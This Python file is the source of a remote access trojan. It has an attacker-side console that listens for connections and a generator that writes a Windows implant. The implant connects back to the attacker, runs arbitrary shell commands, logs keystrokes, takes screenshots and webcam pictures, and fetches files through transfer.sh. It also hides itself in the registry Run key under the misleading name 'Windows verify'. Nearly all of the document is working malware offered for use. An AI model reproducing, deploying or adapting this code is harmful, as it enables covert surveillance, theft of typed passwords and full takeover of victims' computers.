from socket import socket, AF_INET, SOCK_STREAM
import sys
import os
import requests
import time

class RAT:
    def __init__(self):
        self.port = 4444 # DEFAULT
        self.address = ('',self.port)
        self.socket = socket(AF_INET, SOCK_STREAM)
        self.keylogger_started = False

    def banner(self):
        print('''	
 @@@@@                                        @@@@@
@@@@@@@                                      @@@@@@@
@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@
 @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@
     @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@
       @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@
         @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@
            @@@@@@@    @@@@@@    @@@@@@
            @@@@@@      @@@@      @@@@@
            @@@@@@      @@@@      @@@@@
             @@@@@@    @@@@@@    @@@@@
              @@@@@@@@@@@  @@@@@@@@@@
               @@@@@@@@@@  @@@@@@@@@
           @@   @@@@@@@@@@@@@@@@@   @@
           @@@@  @@@@ @ @ @ @ @@@@  @@@@
          @@@@@   @@@ @ @ @ @ @@@   @@@@@
        @@@@@      @@@@@@@@@@@@@      @@@@@
      @@@@          @@@@@@@@@@@          @@@@
   @@@@@              @@@@@@@              @@@@@
  @@@@@@@                                 @@@@@@@
   @@@@@                                   @@@@@''')

    def menu(self):
        help_menu = {'Help':'Show this mensage', 'listen':'Start listener on determined port', 'gen':'Generates payload', 'clear':'Clears screen'}
        while 1:
            cmd = input('pirate@menu> ')
            if cmd == 'help':
                for n in help_menu:
                    print(n + ' .... ' + help_menu[n])
                print()
            elif cmd.startswith('gen'):
                if cmd == 'gen':
                    print('Usage: gen <lhost> <lport> <payload_name.py>')
                else:
                    lhost = cmd.split(' ')[1]
                    lport = cmd.split(' ')[2]
                    pname = cmd.split(' ')[3]
                    self.generate_payload(lhost, lport, pname)
            elif cmd.startswith('listen'):
                if cmd == 'listen':
                    print('[!] Using default port')
                if len(cmd)>6:
                    port = cmd.split(' ')[1]
                try:
                    self.port = int(port)
                    self.address = ('',self.port)
                    self.listen()
                except:
                    print('[-] Port must be a number!!')
                
            elif cmd == 'clear':
                self.clear()
            elif cmd == '':
                pass
            else:
                print('Unknow command')


    def listen(self):
        s = self.socket
        try:
            s.bind(self.address)
            s.listen()
            print('\n[*] Listening on port: %i'%self.port)
            self.conn, self.addr = s.accept()
            print('[+] Connection received from',self.addr)
            self.main()
        except OSError:
            print('This port is already in use!')
    def clear(self):
        if sys.platform.startswith('win'):
            os.system('cls')
        else:
            os.system('clear')
    def help(self):
        print('sysinfo       ::  show victims system info')
        print('shell         ::  open shell on victim machine')
        print('screenshot    ::  take screenshot from victim machine')
        print('webcam        ::  take picture from victims webcam')
        print('send_file     ::  send file to victim machine')
        print('persistence   ::  run persistence script (windows victim only)')
        print('keylogger     ::  run keylogger on victim machine')
        print('msg           ::  open MessageBox on victim machine (windows victim only)')
        print('help          ::  show this message')
        print('clear         ::  clear console')
        print('exit or close ::  close connection')
        print()

    def main(self):
        print()
        started = self.keylogger_started
        while 1:
            EXIT = False
            conn = self.conn
            cmd = input('pirate@%s> '%self.addr[0])
            if cmd == 'shell':
                conn.send(cmd.encode())
                print(conn.recv(1024).decode(),end="")
                while EXIT != True:
                    cmd = input('> ')
                    if cmd == 'exit':
                        EXIT = True
                        print()
                    elif cmd == '' or cmd == ' ':
                        pass
                    else:
                        conn.send(('shell:'+cmd).encode())
                        print(conn.recv(40960).decode('Latin-1'),end="")
            elif cmd == 'clear':
                self.clear()
            elif cmd == 'help':
                self.help()

            elif cmd == 'screenshot':
                runtime = time.asctime()[11:].replace(' ','-').replace(':','-')
                if not os.path.isdir('output'):
                    os.system('mkdir output')
                filename = 'output/screenshot-%s.png'%runtime
                conn.send(cmd.encode())
                data = conn.recv(200000)
                with open(filename,'wb') as img:
                    img.write(data)
                    img.close()
                print('screenshot saved as: %s\n'%filename)
            
            elif cmd == 'webcam':
                runtime = time.asctime()[11:].replace(' ','-').replace(':','-')
                if not os.path.isdir('output'):
                    os.system('mkdir output')
                filename = 'output/webcam-%s.jpg'%runtime
                conn.send(cmd.encode())
                data = conn.recv(200000)
                with open(filename,'wb') as img:
                    img.write(data)
                    img.close()
                print('webcam image saved as: %s\n'%filename)

            elif cmd.startswith('send_file'):
                if cmd == 'send_file':
                    print('Usage: send_file <file_name>\n')
                if len(cmd.split(' ')) == 2:
                    filename = cmd.split(' ')[1]
                    if os.path.isfile(filename):
                        url = 'https://transfer.sh/'
                        data = open(filename, 'rb')
                        upload = {filename: data}
                        response = requests.post(url, files=upload)
                        data.close()
                        download_link = response.content.decode('utf-8')
                        conn.send(('file:'+download_link).encode())
                        print('File sended!')
                    else:
                        print('Error!\nFile not found!')
            
            elif cmd == 'persistence':
                conn.send(cmd.encode())
                msg = conn.recv(1024).decode()
                print(msg)
            elif cmd.startswith('keylogger'):
                if cmd == 'keylogger':
                    print('Usage:')
                    print('keylogger --start')
                    print('keylogger --dump')
                    print('kelogger --stop')
                elif cmd.startswith('keylogger --'):
                    msg = 'keylogger:'+cmd.split('--')[1]            
                    conn.send(msg.encode())
                    if cmd == 'keylogger --start':
                        started = True
                    elif cmd == 'keylogger --stop':
                        started = False
                    if cmd == 'keylogger --dump':
                        if started:
                            print(conn.recv(2048).decode())
                        else:
                            print('[!] Error, keylogger not started!')

            elif cmd == 'sysinfo':
                conn.send(cmd.encode())
                sysinfo = conn.recv(4096).decode('Latin_1')
                print(sysinfo)

            elif cmd == 'msg':
                print('Usage: msg <your_message>')
            
            elif cmd.startswith('msg '):
                msg = cmd[4:]
                conn.send(str('msg:'+msg).encode())
                print('Sended!')
            elif cmd == '':
                pass

            elif cmd == 'exit' or cmd == 'close':
                exit()
            else:
                print('Invalid command!\n')
    def generate_payload(self, host, port, file_name):
        payload ="""from cv2 import VideoCapture, imwrite
from pynput.keyboard import Key, Listener
from os.path import realpath
from winreg import *
import socket,os,subprocess,pyautogui,time,requests,numpy,idna,platform
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('"""+host+"""', """+port+"""))
keyLog = str()
def start():
    global listener
    listener = Listener(on_press=on_press)
    listener.start()
def on_press(key):
    global keyLog
    keyLog+=str(key).replace("'","").replace('Key.space',' ').replace('Key.ctrl_l','<ctrl>').replace('Key.shift','<shift>').replace('Key.enter','\\n').replace('Key.backspace',' <bck>').replace('Key.esc','<esc>')  
def dump():
    global keyLog
    dump = keyLog.replace('<shift>1','!').replace('<shift>2','@').replace('<shift>3','#').replace('<shift>4','$').replace('<shift>5','%%').replace('<shift>7','&').replace('<shift>8','*').replace('<shift>9','(').replace('<shift>0',')')
    keyLog = ""
    return dump
def stop():
    global listener
    listener.stop()
def persistence(executable):
    path_file='"%s"'%realpath(executable)
    run = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    try:
        key = OpenKey(HKEY_CURRENT_USER,run,0,KEY_SET_VALUE)
    except PermissionError:
        return('Failed!\\nRequire admin privileges')
    else:
        SetValueEx(key,'Windows verify',0,REG_SZ,path_file+' -silent')
        key.Close()        
while True:
    conn = s.recv(1024).decode('utf-8')
    if conn == 'shell':
        s.send(os.getcwd().encode())
    if conn.startswith('shell:'):
        conn = conn[6:]
        if conn[:3] == 'cd ':
            dir = os.path.expandvars(conn[3:])
            if os.path.isdir(dir):
                os.chdir(dir)
            cmd = b''
        else:      
            proc = subprocess.Popen(conn, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL, shell=True)
            stdout, stderr = proc.communicate()
            cmd = stdout+stderr
        cmd += str('\\n'+os.getcwd()).encode()
        s.send(cmd)
    if conn == 'screenshot':
        runtime = time.asctime()[11:].replace(' ','-').replace(':','-')
        filename = 'screenshot-%s.png'%runtime
        sc = pyautogui.screenshot()
        sc.save(filename)
        data = open(filename,'rb').read()
        s.send(data)
    if conn == 'webcam':
        runtime = time.asctime()[11:].replace(' ','-').replace(':','-')
        filename = 'webcamshot-%s.jpg'%runtime
        cam = VideoCapture(0)   
        x, img = cam.read()
        if x:   
            imwrite(filename,img) 
        data = open(filename, 'rb')
        s.send(data.read())
        data.close()
    if conn.startswith('file:'):
        url = conn[5:]
        filename = url[26:]
        content = requests.get(url).content
        with open(filename, 'wb') as f:
            f.write(content)
            f.close()
    if conn.startswith('keylogger:'):
        args = conn[10:]
        if args == 'start':
            start()
        if args == 'dump':
            text = dump()
            s.send(text.encode())
        if args == 'stop':
            stop()
    if conn == 'persistence':
        filename = os.path.realpath(__file__)
        code = persistence(filename)
        if code != None:
            s.send('Error!'.encode())
        else:
            s.send('Persistence execute with success!'.encode())
    if conn == 'sysinfo':
        OS = '{} {} ({})'.format(platform.system(),platform.release(),platform.version())
        NAME = platform.node()
        if '64' in platform.machine():
            ARCH = 'x64'
        else:
            ARCH = 'x86'
        sysinfo = 'Name          :: {}\\nOS            :: {}\\nArchitecture  :: {}'.format(NAME,OS,ARCH)
        s.send(sysinfo.encode('Latin_1'))
    if conn.startswith('msg:'):
        msg = conn[4:]
        payload = 'cd %temp% & echo MsgBox("{}") > tempmsg.vbs & start tempmsg.vbs'.format(msg)
        p = subprocess.Popen(payload,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL, shell=True)"""
        with open(file_name,'w') as payload_file:
            payload_file.write(payload)
            payload_file.close()
        print('Writed %i bytes payload to %s'%(len(payload.encode()),file_name))
    
def init():
    main = RAT()
    main.clear()
    #main.banner()
    main.menu()

init()
